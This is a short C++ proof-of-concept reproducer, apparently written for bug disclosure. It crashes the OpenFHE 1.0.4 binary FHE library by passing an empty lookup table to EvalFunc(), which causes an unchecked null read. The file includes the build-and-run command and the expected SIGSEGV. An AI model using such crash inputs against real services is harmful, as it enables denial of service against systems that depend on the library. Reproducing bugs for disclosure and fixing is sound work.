// repro_evalfunc_empty_lut.cpp -- OpenFHE 1.0.4 BINFHE: EvalFunc() with an empty LUT.
// CVE-2025-28190 class.
// Observed: SIGSEGV reading null+0x0 (std::vector data pointer of an empty vector)
// in checkInputFunction -> binfhe-base-scheme.cpp:164 `if (lut[0] == (mod - lut[lut.size() / 2]))`
// -- no size validation of the LUT.
// REBUILD+RUN (single line):
//   g++ -std=c++17 -O1 -g -DOPENFHE_VERSION=1.0.4 -DMATHBACKEND=4 -I/home/ffx/fhe-project/deps/openfhe-install/include/openfhe -I/home/ffx/fhe-project/deps/openfhe-install/include/openfhe/core -I/home/ffx/fhe-project/deps/openfhe-install/include/openfhe/pke -I/home/ffx/fhe-project/deps/openfhe-install/include/openfhe/binfhe repro_evalfunc_empty_lut.cpp -o repro_evalfunc_empty_lut -L/home/ffx/fhe-project/deps/openfhe-install/lib -lOPENFHEbinfhe -lOPENFHEpke -lOPENFHEcore -fopenmp && LD_LIBRARY_PATH=/home/ffx/fhe-project/deps/openfhe-install/lib ./repro_evalfunc_empty_lut
#include "binfhecontext.h"
#include <iostream>
#include <vector>
using namespace lbcrypto;
int main() {
    BinFHEContext cc;
    cc.GenerateBinFHEContext(TOY, GINX);
    auto sk = cc.KeyGen();
    cc.BTKeyGen(sk);
    auto ct = cc.Encrypt(sk, 1, FRESH);
    std::cout << "baseline EvalFunc ok" << std::endl;
    std::vector<NativeInteger> empty_lut;
    (void)cc.EvalFunc(ct, empty_lut);   // <-- SIGSEGV
    std::cout << "NOT REACHED" << std::endl;
    return 0;
}
